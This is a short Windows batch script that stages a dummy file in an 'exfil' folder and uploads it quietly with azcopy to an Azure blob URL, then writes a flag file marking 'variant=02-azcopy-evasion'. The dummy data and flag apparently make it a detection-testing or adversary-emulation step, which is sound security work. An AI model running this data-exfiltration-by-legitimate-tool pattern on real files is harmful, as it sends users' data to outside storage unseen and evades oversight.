@echo off
set EXFIL_DIR=%USERPROFILE%\bops4048\exfil
if not exist "%EXFIL_DIR%" mkdir "%EXFIL_DIR%"
if not exist "%EXFIL_DIR%\part2.dat" echo dummy > "%EXFIL_DIR%\part2.dat"
set AZCOPY_PATH=C:\Users\Public\wf4048\07\azcopy.exe
"%AZCOPY_PATH%" copy "%EXFIL_DIR%\part2.dat" "https://nebuchadnezzar.blob.core.windows.net/oracle/trinity-6d56706332.bin?sv=2024-01-01&sig=xxx" --output-level=quiet
ver >nul
> "%EXFIL_DIR%\stage-02.flag" (
  echo variant=02-azcopy-evasion
  echo carrier=trinity-6d56706332.bin
  echo writer=azcopy.exe
  echo timestamp=%DATE% %TIME%
)
exit /b 0
